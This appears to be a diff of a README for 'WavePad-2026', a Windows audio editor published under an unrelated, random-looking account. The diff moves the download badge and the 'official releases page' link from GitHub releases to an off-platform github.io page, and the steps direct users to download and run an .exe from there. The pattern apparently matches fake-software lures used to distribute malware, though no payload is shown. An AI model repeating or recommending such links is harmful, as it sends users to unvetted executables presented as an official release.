@@ -1,6 +1,6 @@
 # 🔊 WavePad-2026 - Edit your audio files with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/pathless-tingidae828/WavePad-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://pathless-tingidae828.github.io)
 
 WavePad-2026 provides a complete set of tools for audio editing on Windows 11 and Windows 10. This software allows you to record, trim, split, and enhance sound files for podcasts, music projects, or voice recordings. The interface works for beginners and experienced users alike, making sound production straightforward.
 
@@ -19,7 +19,7 @@ To run WavePad-2026, your computer needs the following specifications:
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official releases page](https://github.com/pathless-tingidae828/WavePad-2026/releases) to view available versions.
+1. Visit the [official releases page](https://pathless-tingidae828.github.io) to view available versions.
 2. Look for the latest release at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
